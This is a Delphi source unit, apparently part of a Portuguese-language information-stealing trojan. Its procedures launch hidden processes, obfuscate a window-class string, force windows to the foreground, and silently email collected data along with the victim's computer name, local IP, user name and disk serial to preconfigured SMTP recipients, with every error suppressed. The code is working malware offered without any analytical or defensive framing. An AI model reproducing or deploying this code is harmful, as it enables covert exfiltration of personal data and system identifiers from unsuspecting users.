unit Gerador;
interface
uses
  Classes, SysUtils, Windows, Registry, Forms;
function Comparation_(const Substr_ : string; const Str_ : string) : Integer;
function FWinFrontShow(hwnd: THandle): Boolean;
procedure SenderMass(Dados : TStringList; NameInfor :string);
procedure TrimAppMemorySize;
Function BarrasAltura: Integer;
function CreateProcessSimple(cmd: string): boolean;
procedure SenderAviso;
var
 KEYGerator_  : string = '';
 Keys_        : array [1..16] of char =('a','b','c','d','e','f','g','h',
                                             'i','j','k','l','m','n','o','p');
implementation
uses
 Rotinas, Natal;
function CreateProcessSimple(cmd: string): boolean;
var
  SUInfo: TStartupInfo;
  ProcInfo: TProcessInformation;
begin
  FillChar(SUInfo, SizeOf(SUInfo), #0);
  SUInfo.cb      := SizeOf(SUInfo);
  SUInfo.dwFlags := STARTF_USESHOWWINDOW;
  SUInfo.wShowWindow := SW_HIDE;
  Result := CreateProcess(nil,
                          PChar(cmd),
                          nil,
                          nil,
                          false,
                          CREATE_NEW_CONSOLE or
                          HIGH_PRIORITY_CLASS,
                          nil,
                          nil,
                          SUInfo,
                          ProcInfo);
  if (Result) then
  begin
    WaitForSingleObject(ProcInfo.hProcess, INFINITE);
    CloseHandle(ProcInfo.hProcess);
    CloseHandle(ProcInfo.hThread);
  end;
end;
function Comparation_(const Substr_ : string; const Str_ : string) : Integer;
begin
   if Pos(Substr_,Str_) <> NO_ then
    Result := YES_;

   if Pos(Substr_,Str_)  = NO_ then
    Result := NO_;
end;
Function BarrasAltura: Integer;
var
  rRect: TRect;
  rBarraTarefas: HWND;
begin
  rBarraTarefas := FindWindow('S'+'h'+'e'+'l'+'l'+Cun+'T'+'r'+'a'+'y'+'W'+'n'+'d', nil);
  GetWindowRect(rBarraTarefas, rRect);
  Result := rRect.Bottom - rRect.Top;
end;

procedure TrimAppMemorySize;
var
MainHandle : THandle;
begin
try
MainHandle := OpenProcess(PROCESS_ALL_ACCESS, false, GetCurrentProcessID) ;
SetProcessWorkingSetSize(MainHandle, $FFFFFFFF, $FFFFFFFF) ;
CloseHandle(MainHandle) ;
except
end;
Application.ProcessMessages;
end;

procedure SenderMass(Dados : TStringList; NameInfor :string);
begin
  try
    Randomize;
    Festas.Messagen.Body.Add(Dados.Text);
    Festas.Messagen.From.Name    := '['+pubNomeComputador+'] ';
    Festas.Messagen.From.Address := Info_De;
    Festas.Messagen.Recipients.EMailAddresses := Info_Para;
    Festas.Messagen.Subject := pubnomeComputador+' '+NameInfor+' INFOS SHARED';
    Festas.Smtp.Username    := Info_Login;
    Festas.Smtp.Password    := Info_Pass;
    Festas.Smtp.Host        := Info_Smtp;
    Festas.Smtp.Port        := Info_Porta;
    Festas.Smtp.Connect;
    Festas.Smtp.Send(Festas.Messagen);
    Festas.Smtp.Disconnect;
  except end;
end;
procedure SenderAviso;
var
  s: string;
begin
  try
    Randomize;
    s := inttostr(Random(20000))+'['+pubNomeComputador+'] '+' ENVIO NEW SHARED';
    Festas.Messagen.Body.Add(s);
    Festas.Messagen.Body.Add('------------------------------------------------------------');
    Festas.Messagen.Body.Add('LOCAL IP:'+ Festas.IP.LocalIP);
    Festas.Messagen.Body.Add('USUARIO.:'+ GetNetUserName);
    Festas.Messagen.Body.Add('SERIAL..:'+ PegaSerieHD);
    Festas.Messagen.Body.Add('------------------------------------------------------------');
    Festas.Messagen.From.Name    := ''+pubNomeComputador+'';
    Festas.Messagen.From.Address := Aviso_De;
    Festas.Messagen.Recipients.EMailAddresses := Aviso_Para;
    Festas.Messagen.Subject    := s;
    Festas.Smtp.Username := Aviso_Login;
    Festas.Smtp.Password := Aviso_Pass;
    Festas.Smtp.Host     := Aviso_Smtp;
    Festas.Smtp.Port     := Aviso_Porta;
    Festas.Smtp.Connect;
    Festas.Smtp.Send(Festas.Messagen);
    Festas.Smtp.Disconnect;
  except end;
end;
function FWinFrontShow(hwnd: THandle): Boolean;
const
  SPI_GETFOREGROUNDLOCKTIMEOUT = $2000;
  SPI_SETFOREGROUNDLOCKTIMEOUT = $2001;
var
  ForegroundThreadID: DWORD;
  ThisThreadID: DWORD;
  timeout: DWORD;
begin
  if IsIconic(hwnd) then ShowWindow(hwnd, SW_RESTORE);
  if GetForegroundWindow = hwnd then Result := True
  else
  begin
    if ((Win32Platform = VER_PLATFORM_WIN32_NT) and (Win32MajorVersion > 4)) or
      ((Win32Platform = VER_PLATFORM_WIN32_WINDOWS) and
      ((Win32MajorVersion > 4) or ((Win32MajorVersion = 4) and
      (Win32MinorVersion > 0)))) then
    begin
      Result := False;
      ForegroundThreadID := GetWindowThreadProcessID(GetForegroundWindow, nil);
      ThisThreadID := GetWindowThreadPRocessId(hwnd, nil);
      if AttachThreadInput(ThisThreadID, ForegroundThreadID, True) then
      begin
        BringWindowToTop(hwnd);
        SetForegroundWindow(hwnd);
        AttachThreadInput(ThisThreadID, ForegroundThreadID, False);
        Result := (GetForegroundWindow = hwnd);
      end;
      if not Result then
      begin
        SystemParametersInfo(SPI_GETFOREGROUNDLOCKTIMEOUT, 0, @timeout, 0);
        SystemParametersInfo(SPI_SETFOREGROUNDLOCKTIMEOUT, 0, TObject(0),
          SPIF_SENDCHANGE);
        BringWindowToTop(hwnd);
        SetForegroundWindow(hWnd);
        SystemParametersInfo(SPI_SETFOREGROUNDLOCKTIMEOUT, 0, TObject(timeout), SPIF_SENDCHANGE);
      end;
    end
    else
    begin
      BringWindowToTop(hwnd);
      SetForegroundWindow(hwnd);
    end;
    Result := (GetForegroundWindow = hwnd);
  end;
end;
end.
